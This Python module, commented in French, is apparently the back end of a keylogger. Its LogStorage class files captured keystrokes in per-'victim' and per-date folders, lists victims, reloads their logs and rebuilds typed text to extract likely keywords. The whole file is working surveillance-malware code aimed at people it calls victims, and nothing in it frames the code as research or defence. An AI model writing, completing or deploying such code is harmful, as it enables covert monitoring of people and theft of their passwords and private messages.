"""
Module de gestion du stockage des logs
"""

import os
import json
from datetime import datetime
import config


class LogStorage:
    def __init__(self):
        self.storage_dir = config.STORAGE_DIR
        self.ensure_storage_dir()
    
    def ensure_storage_dir(self):
        """
        Crée le dossier de stockage s'il n'existe pas
        """
        if not os.path.exists(self.storage_dir):
            os.makedirs(self.storage_dir)
            print(f"[+] Dossier de stockage créé: {self.storage_dir}")
    
    def get_victim_dir(self, victim_id):
        """
        Retourne le chemin du dossier pour une victime donnée
        """
        victim_dir = os.path.join(self.storage_dir, victim_id)
        if not os.path.exists(victim_dir):
            os.makedirs(victim_dir)
        return victim_dir
    
    def get_date_dir(self, victim_id):
        """
        Retourne le chemin du dossier pour la date actuelle
        """
        victim_dir = self.get_victim_dir(victim_id)
        date_str = datetime.now().strftime(config.DATE_FORMAT)
        date_dir = os.path.join(victim_dir, date_str)
        
        if not os.path.exists(date_dir):
            os.makedirs(date_dir)
        
        return date_dir
    
    def save_logs(self, victim_id, logs):
        """
        Sauvegarde les logs d'une victime
        """
        try:
            date_dir = self.get_date_dir(victim_id)
            timestamp = datetime.now().strftime("%H-%M-%S")
            filename = f"log_{timestamp}.json"
            filepath = os.path.join(date_dir, filename)
            
            # Si le fichier existe déjà, charger et fusionner
            if os.path.exists(filepath):
                with open(filepath, 'r', encoding='utf-8') as f:
                    existing_logs = json.load(f)
                existing_logs.extend(logs)
                logs = existing_logs
            
            # Sauvegarder
            with open(filepath, 'w', encoding='utf-8') as f:
                json.dump(logs, f, ensure_ascii=False, indent=2)
            
            return True
        
        except Exception as e:
            print(f"[-] Erreur lors de la sauvegarde: {e}")
            return False
    
    def get_victims(self):
        """
        Retourne la liste de toutes les victimes (dossiers dans storage_dir)
        """
        if not os.path.exists(self.storage_dir):
            return []
        
        victims = []
        for item in os.listdir(self.storage_dir):
            item_path = os.path.join(self.storage_dir, item)
            if os.path.isdir(item_path):
                victims.append(item)
        
        return victims
    
    def get_victim_logs(self, victim_id, date=None):
        """
        Récupère les logs d'une victime pour une date donnée
        """
        victim_dir = self.get_victim_dir(victim_id)
        
        if date:
            date_dir = os.path.join(victim_dir, date)
        else:
            # Prendre la date la plus récente
            dates = [d for d in os.listdir(victim_dir) if os.path.isdir(os.path.join(victim_dir, d))]
            if not dates:
                return []
            date = max(dates)
            date_dir = os.path.join(victim_dir, date)
        
        if not os.path.exists(date_dir):
            return []
        
        all_logs = []
        for filename in sorted(os.listdir(date_dir)):
            if filename.endswith('.json'):
                filepath = os.path.join(date_dir, filename)
                try:
                    with open(filepath, 'r', encoding='utf-8') as f:
                        logs = json.load(f)
                        all_logs.extend(logs)
                except Exception as e:
                    print(f"[-] Erreur lors de la lecture de {filepath}: {e}")
        
        return all_logs
    
    def analyze_logs(self, logs):
        """
        Analyse basique des logs (mots-clés, séquences répétitives)
        """
        analysis = {
            "total_keys": len(logs),
            "keywords": [],
            "repetitive_sequences": []
        }
        
        # Extraire les mots-clés potentiels (séquences de caractères alphanumériques)
        text = ""
        for log in logs:
            key = log.get('key', '')
            if len(key) == 1 and key.isalnum():
                text += key
            elif key == ' ':
                text += ' '
        
        # Chercher des mots de plus de 4 caractères
        words = text.split()
        keywords = [w for w in words if len(w) >= 4]
        analysis["keywords"] = list(set(keywords))[:10]  # Top 10
        
        # Chercher des séquences répétitives (ex: même touche plusieurs fois)
        if logs:
            current_key = None
            count = 0
            for log in logs:
                key = log.get('key', '')
                if key == current_key:
                    count += 1
                else:
                    if count >= 3 and current_key:
                        analysis["repetitive_sequences"].append({
                            "key": current_key,
                            "count": count
                        })
                    current_key = key
                    count = 1
        
        return analysis

